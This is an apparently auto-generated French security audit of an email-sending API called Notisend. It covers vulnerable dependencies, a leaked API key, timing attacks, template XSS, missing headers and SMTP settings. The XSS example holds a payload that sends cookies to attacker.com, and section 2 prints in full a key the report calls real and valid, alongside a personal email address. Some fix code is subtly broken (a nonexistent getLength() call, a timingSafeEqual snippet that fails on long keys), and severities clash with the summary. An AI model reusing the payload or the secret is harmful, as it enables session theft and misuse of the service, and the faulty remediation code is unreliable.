# 🔒 Analyse de Sécurité — Notisend

Date : 2026-09-21  
Projet : Notisend (Service d'envoi d'emails)  
Technos : Hono / Node.js / TypeScript / Nodemailer

---

## 1. Vulnérabilités des Dépendances (CRITIQUE)

| Paquet | Version installée | Version corrigée | Sévérité | Risque |
|--------|-------------------|------------------|----------|--------|
| `hono` | <=4.13.4 | >=4.13.5 | Modéré | ReDoS via CORS (`Access-Control-Request-Headers`), divulgation de données SSR via `memo()`, Proxy Helper ne supprime pas les headers `Connection`, Algorithmic Complexity DoS dans Language Middleware, `toSSG()` écrit hors du dossier de sortie, parsing de corps non borné, parsing d'URL fragment |
| `nodemailer` | <=9.1.0 | >=9.1.1 | **Élevé** | Bypass de `disableFileAccess`/`disableUrlAccess` via `resolveContent()`, bypass de validation de domaine IDN/Punycode, DoS O(n²) dans le parseur d'adresses, bypass de validation de domaine destinataire via commentaires RFC 5322 |
| `@hono/node-server` | 2.0.x | >=2.1.1 | Modéré | DoS via aborted WebSocket handshake |

**Vérification** : `npm audit` rapporte **3 vulnérabilités** (2 modérées, 1 élevée).

**Action** :
```bash
npm audit fix
npm install hono@latest nodemailer@latest @hono/node-server@latest
```

---

## 2. Clé API Exposée (CRITIQUE)

Le fichier `.env.example` contient une **clé API réelle** en clair :

```
MAIL_API_KEY=wYOh9ufB+6P17chafCsCrcbS/e/Wb1x9CbtiaqHCFGkCQVLZ5LBgZHnCPeH3CFKHPWryZfkPbqLMg9hp/TXrWQ==
```

**Risque** : Toute personne clonant le dépôt dispose de la clé API valide, permettant un accès non autorisé au service d'envoi d'emails (usurpation d'identité, spam, coûts SMTP).

**Action** :
- Remplacer la valeur par un placeholder (`your-api-key`) dans `.env.example`
- Révoquer la clé exposée immédiatement
- Régénérer une nouvelle clé API
- Vérifier si la clé a déjà été utilisée dans des contextes non autorisés

---

## 3. Authentification Faible (ÉLEVÉ)

### 3.1 Timing Attack sur la comparaison de clé

Dans `src/middlewares/auth.ts` :
```ts
if (!apiKey || apiKey !== env.MAIL_API_KEY) {
```

La comparaison `!==` est une comparaison de chaîne standard qui **retourne dès le premier caractère différent**. Cela permet une **attaque par oracle de temporisation** (timing attack) pour deviner la clé caractère par caractère.

**Action** : Utiliser `crypto.timingSafeEqual()` avec des buffers de même longueur :
```ts
import crypto from "node:crypto";

const provided = Buffer.from(apiKey.padEnd(64, "\0"));
const expected = Buffer.from(env.MAIL_API_KEY.padEnd(64, "\0"));
if (!crypto.timingSafeEqual(provided, expected)) { ... }
```

### 3.2 Absence de Rate Limiting

Aucun mécanisme de limitation de débit n'est en place. Un attaquant peut :
- Tenter une force brute de l'API key à l'infini
- Envoyer des milliers d'emails sans restriction
- Mener des attaques par déni de service sur le SMTP

**Action** : Ajouter un middleware de rate limiting (ex: `hono-rate-limit` ou un middleware personnalisé basé sur Redis/in-memory).

### 3.3 Pas de Rotation de Clés

Aucun mécanisme de révocation ou de gestion de clés multiples. Si une clé est compromise, elle reste valide indéfiniment.

**Action** : Implémenter un système de clés avec dates d'expiration et de rotation.

---

## 4. Injection HTML / XSS (ÉLEVÉ)

Le système de templates dans `src/services/template.ts` remplace directement les placeholders sans **échappement HTML** :

```ts
for (const [key, val] of Object.entries(safeVars)) {
    html = html.replaceAll(`{{${key}}}`, val);
}
```

**Risque** : Un attaquant peut injecter du HTML/JavaScript arbitraire via les champs `subject`, `text`, `link`, ou `value`. Si ces emails sont affichés dans un client de messagerie web ou un lecteur d'emails HTML, cela constitue un **XSS stocké**.

**Exemple d'exploitation** :
```json
{
  "subject": "<script>alert(document.cookie)</script>",
  "templateType": "simple",
  "text": "<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>"
}
```

**Action** : Échapper les variables HTML avec une bibliothèque comme `he` ou `DOMPurify` :
```ts
import { escape } from "he";
html = html.replaceAll(`{{${key}}}`, escape(val));
```

---

## 5. Absence de Headers de Sécurité (MODÉRÉ)

Aucun des headers de sécurité suivants n'est configuré :

| Header | Statut | Importance |
|--------|--------|------------|
| `Strict-Transport-Security` | ❌ Absent | Force HTTPS |
| `X-Frame-Options` | ❌ Absent | Protection contre le clickjacking |
| `Content-Security-Policy` | ❌ Absent | Limite l'exécution de scripts |
| `X-Content-Type-Options` | ❌ Absent | Empêche le MIME sniffing |
| `Referrer-Policy` | ❌ Absent | Contrôle les referer headers |
| `Permissions-Policy` | ❌ Absent | Contrôle les API navigateur |

**CORS** : Aucune configuration CORS explicite. Le comportement par défaut dépend du navigateur/client et peut être trop permissif.

**Action** : Ajouter un middleware Hono pour les headers de sécurité :
```ts
app.use("*", async (c, next) => {
    c.header("X-Content-Type-Options", "nosniff");
    c.header("X-Frame-Options", "DENY");
    c.header("Content-Security-Policy", "default-src 'none'");
    c.header("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
    await next();
});
```

---

## 6. Pas de Limitation de Taille de Requête (MODÉRÉ)

Aucune limite n'est configurée sur la taille du body JSON (`c.req.json()`). Un attaquant peut :
- Envoyer un payload JSON de plusieurs Go pour épuiser la mémoire
- Exploiter le parsing de corps non borné de Hono (CVE mentionné dans les vulnérabilités)

**Action** : Limiter la taille du body :
```ts
app.use("*", async (c, next) => {
    const raw = await c.req.raw.clone();
    if (raw.body && raw.body.getLength() > 1_000_000) { // 1MB
        return c.json({ error: "Payload trop volumineux" }, 413);
    }
    await next();
});
```

---

## 7. Configuration SMTP Dangereuse (MODÉRÉ)

- `SMTP_SECURE=false` par défaut → les credentials et le contenu des emails transitent en clair
- `SMTP_PASS` et `SMTP_USER` exposés dans `.env.example` sans masquage
- Pas de vérification du certificat TLS si `SMTP_SECURE=true` est configuré

**Action** :
- Mettre `SMTP_SECURE=true` par défaut
- Utiliser `SMTP_PORT=465` ou `587` avec TLS
- Masquer les credentials SMTP dans `.env.example`

---

## 8. Endpoint `/health` Non Protégé (BAS)

```ts
app.get("/health", (c) => c.json({ status: "ok" }));
```

Bien qu'inoffensif en soi, cet endpoint révèle que le service est actif et accessible, facilitant le reconnaissance pour un attaquant.

**Action** : Considérer limiter l'accès ou masquer des détails sensibles.

---

## 9. Logging des Erreurs (BAS)

```ts
console.error("Erreur envoi mail:", err);
```

Les erreurs sont loguées en clair dans la console, ce qui peut :
- Divulguer des informations sensibles (creds SMTP internes, chemins de fichiers, erreurs de configuration)
- Enregistrer des données personnelles (emails destinataires, contenu) dans les logs

**Action** : Utiliser un système de logging structuré avec filtrage des données sensibles (ex: `pino`, `winston`), et ne jamais loguer les credentials.

---

## 10. Pas de HTTPS Forcé (BAS)

```ts
serve({ fetch: app.fetch, port: env.PORT }, ...);
```

Le serveur écoute en HTTP. Si déployé en production sans reverse proxy TLS, les données (y compris l'API key et les emails) transitent en clair.

**Action** : Déployer derrière un reverse proxy (Nginx, Traefik) avec TLS/SSL.

---

## 11. Pas de Validation de Domaine Email (MODÉRÉ)

Le schéma Zod valide le format email mais ne vérifie pas la propriété du domaine. Un attaquant peut utiliser `from: "spoof@random.com"` pour usurper l'identité de l'expéditeur.

**Action** : Restreindre les domaines autorisés `from` ou implémenter SPF/DKIM/DMARC côté serveur SMTP.

---

## 12. Absence de Logging/Audit Trail (MODÉRÉ)

Aucun mécanisme d'audit ne trace les requêtes (qui a envoyé quel email, quand, vers qui). Cela empêche la traçabilité en cas de compromission ou d'utilisation malveillante.

**Action** : Implémenter un audit log structuré pour chaque requête `/api/mail`.

---

## 13. Fichier `sendmail.http` (BAS)

Le fichier `sendmail.http` contient un exemple de requête avec une adresse email réelle (`ebanethboris@icloud.com`), bien que le fichier soit dans `.gitignore` via `http-client.private*`. Vérifier qu'il est bien exclu du dépôt.

**Action** : Vérifier que le fichier est bien dans `.gitignore` et ne pas le commiter.

---

## Résumé des Priorités

| # | Trouvaille | Sévérité | Action immédiate |
|---|-----------|----------|-----------------|
| 1 | Clé API dans `.env.example` | 🔴 Critique | Révoquer la clé + corriger `.env.example` |
| 2 | Vulnérabilités nodemailer (email bypass) | 🔴 Critique | `npm audit fix` + mise à jour |
| 3 | XSS dans templates HTML | 🔴 Élevé | Échapper les variables HTML |
| 4 | Pas de rate limiting | 🟠 Élevé | Ajouter middleware rate-limit |
| 5 | Timing attack sur API key | 🟠 Élevé | `crypto.timingSafeEqual()` |
| 6 | Vulnérabilités hono (ReDoS, SSR) | 🟡 Modéré | Mettre à jour hono >=4.13.5 |
| 7 | Pas de headers sécurité | 🟡 Modéré | Ajouter CORS + security headers |
| 8 | Pas de limite body size | 🟡 Modéré | Limiter taille du body |
| 9 | SMTP en clair par défaut | 🟡 Modéré | Mettre `SMTP_SECURE=true` |
| 10 | Pas de HTTPS | 🔵 Bas | Configurer TLS en production |
| 11 | Pas de validation domaine from | 🔵 Bas | Restreindre les domaines autorisés |
| 12 | Pas de logging d'audit | 🔵 Bas | Ajouter un audit trail |
| 13 | Erreurs loguées en clair | 🔵 Bas | Utiliser un logger sécurisé |

---

## Recommandation Générale

Avant tout déploiement en production, appliquer dans l'ordre :

1. **Révoquer** la clé API exposée dans `.env.example`
2. `npm audit fix` et mettre à jour toutes les dépendances
3. Ajouter un **rate limiter** et corriger la comparaison de clé
4. **Échapper** les templates HTML
5. Ajouter les **headers de sécurité** et la limitation de taille
6. Configurer **HTTPS** et **TLS SMTP**
7. Implémenter un **système de logging d'audit**

---

*Rapport généré automatiquement le 2026-09-21*